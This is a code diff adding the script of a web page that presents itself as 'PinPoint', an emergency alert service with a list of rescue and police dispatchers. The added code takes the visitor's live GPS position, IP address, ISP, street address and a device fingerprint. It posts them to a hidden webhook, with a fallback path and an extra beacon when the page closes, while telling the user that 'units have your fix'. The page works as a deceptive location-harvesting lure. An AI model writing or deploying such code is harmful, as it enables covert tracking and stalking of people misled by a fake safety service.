@@ -55,4 +55,47 @@ function ip(){return fetch("https://api.ipify.org?format=json").then(function(r)
 function geo(){return fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){if(!j.error)g=j;return g}).catch(function(){return null})}
 function addr(la,lo){fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat="+la+"&lon="+lo,{headers:{Accept:"application/json"}}).then(function(r){return r.json()}).then(function(j){ad=j.display_name||"";$("ad").textContent=ad||"unresolved";if(ad)$("ad").onclick=function(){window.open("https://www.google.com/maps?q="+la+","+lo)}}).catch(function(){$("ad").textContent="unresolved"})}
 function map(la,lo){if(map.t&&Math.abs(map.t[0]-la)<8e-4&&Math.abs(map.t[1]-lo)<8e-4)return;map.t=[la,lo];var d=4e-3,b=[lo-d,la-d,lo+d,la+d].join(",");$("mp").innerHTML='<iframe loading="lazy" src="https://www.openstreetmap.org/export/embed.html?bbox='+b+'&layer=mapnik&marker='+la+','+lo+'"></iframe>'}
-function ok
+function ok(p){var k=p.coords;c={lat:k.latitude,lon:k.longitude,acc:k.accuracy};
+$("gr").style.display="grid";$("la").textContent=c.lat.toFixed(6);$("lo").textContent=c.lon.toFixed(6);
+$("aa").textContent=Math.round(c.acc)+" m";$("fp").textContent=fp;
+$("la").onclick=$("lo").onclick=function(){window.open("https://www.google.com/maps?q="+c.lat+","+c.lon)};
+map(c.lat,c.lon);
+var a=Math.round(c.acc);$("ac").textContent=a+" m";$("u").textContent=Math.max(1,Math.round(14-a/22));$("et").textContent=(Math.round(a/45)+3)+" min";
+S("Live — locked at "+a+" m accuracy",1);
+var mv=ok.t?Math.abs(ok.t[0]-c.lat)+Math.abs(ok.t[1]-c.lon)>15e-4:1;ok.t=[c.lat,c.lon];
+if(mv){ad="";addr(c.lat,c.lon)}}
+function bad(e){S({1:"Permission denied",2:"Position unavailable",3:"Timed out"}[e.code]||"Location error",0);L("geo: "+e.message)}
+function arm(){if(armed)return;if(!navigator.geolocation){S("Geolocation unsupported",0);return}
+armed=1;fp=F();$("fp").textContent=fp;$("ab").textContent="Location armed";$("ab").disabled=1;S("Requesting permission…",0);L("arming stream");
+navigator.geolocation.watchPosition(ok,bad,{enableHighAccuracy:1,maximumAge:5000,timeout:15000});ip();geo()}
+function send(){
+if(busy)return;busy=1;var b=$("al");b.disabled=1;b.textContent="TRANSMITTING…";
+var ready=c?Promise.resolve():(arm(),new Promise(function(r){setTimeout(r,1200)}));
+ready.then(function(){return ip()}).then(function(ipaddr){return geo().then(function(){return ipaddr})}).then(function(ipaddr){
+var la=c?c.lat:(g&&g.latitude)||null,lo=c?c.lon:(g&&g.longitude)||null,prec=!!c;
+var f=[
+{n:"📍 Coords",v:la?la.toFixed(6)+", "+lo.toFixed(6):"unavailable",i:1},
+{n:"🎯 Accuracy",v:c?Math.round(c.acc)+" m":"IP-based (coarse)",i:1},
+{n:"🛰 Fix",v:prec?"GPS / high accuracy":"IP approximation",i:1},
+{n:"🌐 IP",v:(ipaddr||"unknown")+(g&&g.city?" — "+[g.city,g.region,g.country_name].filter(Boolean).join(", "):""),i:0},
+{n:"📡 ISP",v:(g&&g.org)||"unknown",i:1},
+{n:"📶 Network",v:(navigator.connection&&navigator.connection.effectiveType)||"n/a",i:1},
+{n:"🏠 Address",v:(ad||"unresolved").slice(0,300),i:0},
+{n:"🖥 Browser",v:navigator.userAgent.slice(0,300),i:0},
+{n:"📐 Screen",v:screen.width+"x"+screen.height+" @dpr "+devicePixelRatio,i:0},
+{n:"🧬 Fingerprint",v:"`"+fp+"`",i:1},
+{n:"🧠 Device",v:navigator.platform+" · "+(navigator.hardwareConcurrency||"?")+" cores",i:1},
+{n:"🕒 Timezone",v:Intl.DateTimeFormat().resolvedOptions().timeZone+" ("+new Date().toLocaleString()+")",i:0},
+{n:"🔗 Referrer",v:(document.referrer||"direct").slice(0,200),i:0}];
+if(la)f.push({n:"🗺 Maps",v:"[Google](https://www.google.com/maps?q="+la+","+lo+") · [OSM](https://www.openstreetmap.org/?mlat="+la+"&mlon="+lo+")",i:0});
+var body={username:"PinPoint",content:prec?"**New alert — GPS confirmed**":"**New alert — coarse only**",embeds:[{title:"🚨 PINPOINT ALERT — Live Location",color:0xff3b5c,description:prec?"**Danger signal triggered.** Live GPS fix + device signature captured.":"**Danger signal triggered.** No GPS fix — IP-derived coarse location only.",fields:f.map(function(x){return{name:x.n,value:x.v,inline:!!x.i}}),timestamp:new Date().toISOString(),footer:{text:"PinPoint Safety Network"}}]};
+return fetch(W+"?wait=true",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)}).then(function(r){return r.ok}).catch(function(){
+return fetch(W,{method:"POST",mode:"no-cors",keepalive:1,headers:{"Content-Type":"text/plain;charset=UTF-8"},body:JSON.stringify(body)}).then(function(){return 1}).catch(function(){return 0})})
+}).then(function(okk){
+if(okk){S("Alert delivered — units have your fix",1);L("relay confirmed");b.textContent="✅ ALERT SENT";setTimeout(function(){b.textContent="🚨 SEND ALERT";b.disabled=0},4000)}
+else{S("Relay failed — tap to retry",0);L("relay failed");b.textContent="🚨 RETRY ALERT";b.disabled=0}
+busy=0}).catch(function(e){S("Relay error — tap to retry",0);L("err: "+e.message);b.textContent="🚨 RETRY ALERT";b.disabled=0;busy=0})}
+["Metro Fire & Rescue","City Police Dispatch","County EMS","Regional SAR","Highway Patrol","Coastal Guard"].forEach(function(d){var e=document.createElement("div");e.textContent=d;$("dp").appendChild(e)});
+fp=F();$("fp").textContent=fp;$("ab").onclick=arm;$("al").onclick=send;L("PinPoint initialised");
+addEventListener("pagehide",function(){if(!armed||!c)return;navigator.sendBeacon(W,new Blob([JSON.stringify({embeds:[{title:"📡 PinPoint — session ended",color:0x4da3ff,description:"Last known: "+c.lat.toFixed(6)+", "+c.lon.toFixed(6)}]})],{type:"application/json"}))});
+</script></body></html>
